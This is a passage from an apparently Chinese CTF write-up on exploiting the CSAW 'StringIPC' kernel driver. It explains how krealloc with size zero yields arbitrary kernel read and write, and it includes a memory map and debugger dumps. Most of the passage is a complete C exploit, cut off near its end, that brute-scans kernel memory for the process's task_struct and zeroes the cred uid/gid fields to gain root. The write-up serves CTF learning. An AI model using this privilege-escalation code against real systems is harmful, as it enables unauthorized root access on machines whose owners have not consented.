@p: object to reallocate memory for.</span></span><br><span class="line"><span class="comment"> * @new_size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The contents of the object pointed to are preserved up to the</span></span><br><span class="line"><span class="comment"> * lesser of the new and old sizes.  If @p is %NULL, krealloc()</span></span><br><span class="line"><span class="comment"> * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a</span></span><br><span class="line"><span class="comment"> * %NULL pointer, the object pointed to is freed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return: pointer to the allocated memory or %NULL in case of error</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">krealloc</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *p, <span class="type">size_t</span> new_size, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">kfree(p);</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_krealloc(p, new_size, flags);</span><br><span class="line"><span class="keyword">if</span> (ret &amp;&amp; kasan_reset_tag(p) != kasan_reset_tag(ret))</span><br><span class="line">kfree(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果传入的size为0，会返回ZERO_SIZE_PTR(<code>#define ZERO_SIZE_PTR ((void *)16)</code>)，即为0x10(而不是0!!!)，此时有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">channel-&gt;buf_size = new_size == 0x10</span><br><span class="line">channel-&gt;buf_size = new_size == 0xffffffffffffffff(size_t无符号)</span><br></pre></td></tr></table></figure><p>如果将channel-&gt;index赋值为target_addr-0x10，根据read&#x2F;write的功能可以绕过size的限制从而实现任意地址读写🙌。</p><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>可以任意地址读写了，要如何提权呢？共学到了三种姿势</p><h5 id="1-修改进程cred结构体"><a href="#1-修改进程cred结构体" class="headerlink" title="1.修改进程cred结构体"></a>1.修改进程cred结构体</h5><p>做过了babydriver那题就比较容易想到的要修改cred结构体了，但要怎么找到cred的地址呢？虽然我们已经可以任意地址读了，但要读哪里才能读到cred呢？头大。。。<br>看了raycp师傅的博客学到了寻找cred结构体的方法tql！。<br>首先线程由于要使用所属进程的资源，在其thread_info结构块中有一个struct task_struct类型的结构体，其内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">struct task_struct &#123;</span><br><span class="line">...</span><br><span class="line">/* process credentials */</span><br><span class="line">conststruct cred __rcu *ptracer_cred; /* Tracer&#x27;s credentials at attach */</span><br><span class="line">conststruct cred __rcu *real_cred; /* objective and real subjective task</span><br><span class="line">* credentials (COW) */</span><br><span class="line">conststruct cred __rcu *cred;    /* effective (overridable) subjective task</span><br><span class="line">* credentials (COW) */</span><br><span class="line">char comm[TASK_COMM_LEN]; /* executable name excluding path</span><br><span class="line">- access with[gs]et_task_comm (which lock</span><br><span class="line">                       it with task_lock())</span><br><span class="line">- initialized normally by setup_new_exec */</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到我们所关心的<code>conststruct cred __rcu *cred; conststruct cred __rcu *real_cred;</code>,还有一个重要的地方在于<code>char comm[TASK_COMM_LEN];</code>，这个字符数组保存了进程的名字，也为我们寻找cred提供了方法。<br>首先，task_struct所需的内存是动态分配得到的，我们知道通过<code>kmem_cache_alloc_node</code>函数申请的空间是在内核的动态分配区域。通过下面的内核映射空间可以确定爆破的范围在0xffff880000000000~0xffffc80000000000。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffffff  ---+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    8M                 |           | unused hole                                   |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffff7ff000  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|</span><br><span class="line">    1M                 |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffff600000  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|</span><br><span class="line">    548K               |           | vsyscalls                                     |+++++++++++++|</span><br><span class="line">0xffffffffff577000  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|</span><br><span class="line">    5M                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffffffff000000  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    1520M              |           | module mapping space (MODULES_LEN)            |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|</span><br><span class="line">    2G                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    64G                |           | EFI region mapping space                      |+++++++++++++|</span><br><span class="line">0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    444G               |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    16T                |           | %esp fixup stacks                             |+++++++++++++|</span><br><span class="line">0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    3T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    16T                |           | kasan shadow memory (16TB)                    |+++++++++++++|</span><br><span class="line">0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|</span><br><span class="line">    1T                 |           | virtual memory map for all of struct pages    |+++++++++++++|</span><br><span class="line">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|</span><br><span class="line">    32T                |           | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB)        |+++++++++++++|</span><br><span class="line">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    64T                |           | direct mapping of all phys. memory            |+++++++++++++|</span><br><span class="line">                       |           | (1 &lt;&lt; MAX_PHYSMEM_BITS)                       |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    8T                 |           | guard hole, reserved for hypervisor           |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |-----------|                                               |-------------|</span><br><span class="line">                       |-----------| hole caused by [48:63] sign extension         |-------------|</span><br><span class="line">                       |-----------|                                               |-------------|</span><br><span class="line">0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+</span><br><span class="line">    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|</span><br><span class="line">0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |  user space |</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">    128T               |           | different per mm                              |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+</span><br></pre></td></tr></table></figure><p>还有这里介绍一个关键的函数int prctl( int option,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )，这是一个系统函数，是为进程制定而设计的。内核对应的处理函数为SYSCALL_DEFINE5()。<br>其中第一个参数option指定操作类型，如指定PR_SET_NAME，即设置进程名，之后的参数即为补充参数。<br>因此我们可以通过执行prctl(PR_SET_NAME,target)即可完成对进程名的设定。</p><p>因此利用方法就很明确了：<br>1.prctl函数设置进程明。<br>2.利用ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel)触发漏洞(channel-&gt;date&#x3D;0x10 channel-&gt;buf_size&#x3D;0xffffffffffffffff)。<br>3.利用任意地址读在0xffff880000000000~0xffffc80000000000范围内利用memmem()函数寻找进程名字符串<code>char comm[TASK_COMM_LEN]</code>。<br>4.找到cred地址后利用任意地址写修改uidgid为0</p><p>触发漏洞：<br>call krealloc时寄存器状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0xffffffffffffffff</span><br><span class="line">$rbx   : 0xffff88001f9411e0  →  0x0000000100000002  →  0x0000000100000002</span><br><span class="line">$rcx   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rdx   : 0x00000000024000c0  →  0x00000000024000c0</span><br><span class="line">$rsp   : 0xffff88001f9e3e28  →  0xffff88001f9c5908  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rbp   : 0xffff88001f9e3e48  →  0xffff88001f9e3e98  →  0xffff88001f9e3f08  →  0xffff88001f9e3f48  →  0x00007fffde817950  →  0x0000000000401c70  →  0x2b54c73d8d4c5741  →  0x2b54c73d8d4c5741</span><br><span class="line">$rsi   : 0x0000000000000000  →  0x0000000000000000    //new_size</span><br><span class="line">$rdi   : 0xffff88001fa10a00  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rip   : 0xffffffffc00001a6  →  0xc08548c11a1355e8  →  0xc08548c11a1355e8</span><br><span class="line">$r8    : 0x0000000000000101  →  0x0000000000000101</span><br><span class="line">$r9    : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r10   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r11   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r12   : 0xffffffffffffffff</span><br><span class="line">$r13   : 0x0000000000000101  →  0x0000000000000101</span><br><span class="line">$r14   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r15   : 0x00007fffde817890  →  0x00007fff00000001  →  0x00007fff00000001</span><br></pre></td></tr></table></figure><p>返回值<code>$rax   : 0x0000000000000010  →  0x0000000000000010</code></p><p>赋值时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">→ 0xffffffffc00001b0 &lt;realloc_ipc_channel.isra+80&gt; mov    QWORD PTR [rbx+0x8], rax</span><br><span class="line">   0xffffffffc00001b4 &lt;realloc_ipc_channel.isra+84&gt; mov    QWORD PTR [rbx+0x10], r12</span><br><span class="line"></span><br><span class="line">$rax   : 0x0000000000000010  →  0x0000000000000010</span><br><span class="line">$r12   : 0xffffffffffffffff</span><br></pre></td></tr></table></figure><p>寻找cred:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">for</span>(;addr &lt; <span class="number">0xffffc80000000000</span>;addr += <span class="number">0x1000</span>)&#123;</span><br><span class="line">       seek_channel.id = alloc_channel.id;</span><br><span class="line">       seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">       seek_channel.whence = SEEK_SET;</span><br><span class="line">       ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">       read_channel.id = alloc_channel.id;</span><br><span class="line">       read_channel.buf = buf;</span><br><span class="line">       read_channel.count = <span class="number">0x1000</span>;</span><br><span class="line">       ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line">       result = memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line">       <span class="keyword">if</span> (result)</span><br><span class="line">&#123;</span><br><span class="line">cred = *(<span class="type">size_t</span> *)(result - <span class="number">0x8</span>);</span><br><span class="line">real_cred = *(<span class="type">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">if</span>( (cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line"><span class="comment">//printf(&quot;[]%lx[]&quot;,result-(int)(buf));</span></span><br><span class="line">target_addr = addr + result-(<span class="type">int</span>)(buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>,target_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>,real_cred);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/40gx 0xffff8800002034c0-0x30     //task_struct</span><br><span class="line">0xffff880000203490:0xffff8800197889680xffff880019788978</span><br><span class="line">0xffff8800002034a0:0xffff8800197889780x0000000000000000</span><br><span class="line">0xffff8800002034b0:0xffff88001f9c26000xffff88001f9c2600  //cred_addr</span><br><span class="line">0xffff8800002034c0:0x3939393939396e610x00616c6539393939  //comm</span><br><span class="line">0xffff8800002034d0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">gef➤  x/30gx 0xffff88001f9c2600    //cred</span><br><span class="line">0xffff88001f9c2600:0xffff88001f9c29000x000003e8000003e8</span><br><span class="line">0xffff88001f9c2610:0x000003e8000003e80x000003e8000003e8</span><br><span class="line">0xffff88001f9c2620:0x00000000000003e80x0000000000000000</span><br><span class="line">0xffff88001f9c2630:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88001f9c2640:0x0000003fffffffff0x0000000000000000</span><br><span class="line">0xffff88001f9c2650:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>改写cred:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">for(int i=0;i&lt;44;i++)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = cred-0x10+4+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">        root_cred[0]=0;</span><br><span class="line">        write_channel.id = alloc_channel.id;</span><br><span class="line">        write_channel.count= 1;</span><br><span class="line">        write_channel.buf = (char*)root_cred;</span><br><span class="line">        ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">完整exp:</span><br><span class="line">```c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#define CSAW_IOCTL_BASE     0x77617363</span><br><span class="line">#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span><br><span class="line">#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span><br><span class="line">#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span><br><span class="line">#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span><br><span class="line">#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span><br><span class="line">#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span><br><span class="line">#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span><br><span class="line">#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span><br><span class="line"></span><br><span class="line">struct alloc_channel_args &#123;</span><br><span class="line">    size_t buf_size;</span><br><span class="line">    int id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct open_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct shrink_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    size_t size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct read_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *buf;</span><br><span class="line">    size_t count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct write_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *buf;</span><br><span class="line">    size_t count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct seek_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    loff_t index;</span><br><span class="line">    int whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct close_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    struct alloc_channel_args alloc_channel;</span><br><span class="line">    struct shrink_channel_args shrink_channel;</span><br><span class="line">    struct seek_channel_args seek_channel;</span><br><span class="line">    struct read_channel_args read_channel;</span><br><span class="line">    struct write_channel_args write_channel;</span><br><span class="line">    struct close_channel_args close_channel;</span><br><span class="line"></span><br><span class="line">    int fd = -1;</span><br><span class="line">    u_int64_t addr = 0xffff880000000000;</span><br><span class="line">    u_int64_t real_cred = 0;</span><br><span class="line">    u_int64_t cred = 0;</span><br><span class="line">    u_int64_t target_addr;</span><br><span class="line">    u_int64_t result = 0;</span><br><span class="line">    int root_cred[12];</span><br><span class="line"></span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    char *buf = malloc(0x1000);</span><br><span class="line">    char target[16];</span><br><span class="line">    strcpy(target,&quot;an9999999999ela&quot;);</span><br><span class="line">    prctl(PR_SET_NAME,target);</span><br><span class="line">    fd = open(&quot;/dev/csaw&quot;,O_RDWR);</span><br><span class="line">    if(fd&lt;0)&#123;</span><br><span class="line">        perror(&quot;open error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    alloc_channel.buf_size = 0x100;</span><br><span class="line">    alloc_channel.id = -1;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel);</span><br><span class="line">    if(alloc_channel.id == -1)&#123;</span><br><span class="line">        perror(&quot;alloc error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[+] you have got a channel %d\n&quot;,alloc_channel.id);</span><br><span class="line">    shrink_channel.id = alloc_channel.id;</span><br><span class="line">    shrink_channel.size = 0x101;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel);   //channel-&gt;date=0x10 channel-&gt;buf_size=0xffffffffffffffff</span><br><span class="line">    printf(&quot;[+] now we can read and write any mem\n&quot;);</span><br><span class="line">    for(;addr &lt; 0xffffc80000000000;addr += 0x1000)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = addr-0x10;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">        read_channel.id = alloc_channel.id;</span><br><span class="line">        read_channel.buf = buf;</span><br><span class="line">        read_channel.count = 0x1000;</span><br><span class="line">        ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line">        result = memmem(buf,0x1000,target,16);</span><br><span class="line">        if (result)</span><br><span class="line">&#123;</span><br><span class="line">cred = *(size_t *)(result - 0x8);</span><br><span class="line">real_cred = *(size_t *)(result - 0x10);</span><br><span class="line">if( (cred||0xff00000000000000) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line">//printf(&quot;[]%lx[]&quot;,result-(int)(buf));</span><br><span class="line">target_addr = addr + result-(int)(buf);</span><br><span class="line">printf(&quot;[+]found task_struct 0x%lx\n&quot;,target_addr);</span><br><span class="line">printf(&quot;[+]found cred 0x%lx\n&quot;,real_cred);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(result == 0)&#123;</span><br><span class="line">puts(&quot;not found , try again &quot;);</span><br><span class="line">exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;44;i++)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = cred-0x10+4+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">        